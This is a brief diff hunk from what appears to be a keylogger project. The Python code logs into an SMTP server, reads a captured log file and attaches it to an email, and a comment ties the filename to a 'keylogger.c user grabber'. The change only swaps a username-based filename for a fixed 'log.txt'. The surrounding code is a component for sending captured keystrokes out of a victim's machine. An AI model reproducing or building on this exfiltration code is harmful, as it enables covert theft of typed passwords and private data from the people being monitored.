@@ -13,7 +13,7 @@ server.starttls(context=context)
 server.login(email, password)
 
 # gather and prepare logfile
-filename =  os.getenv('username') + "_log.txt" # based on keylogger.c user grabber
+filename =  "log.txt"
 f = open(filename, "r")
 logfile_attachment = MIMEText(f.read())
 logfile_attachment.add_header('Content-Disposition', 'attachment', filename=filename)
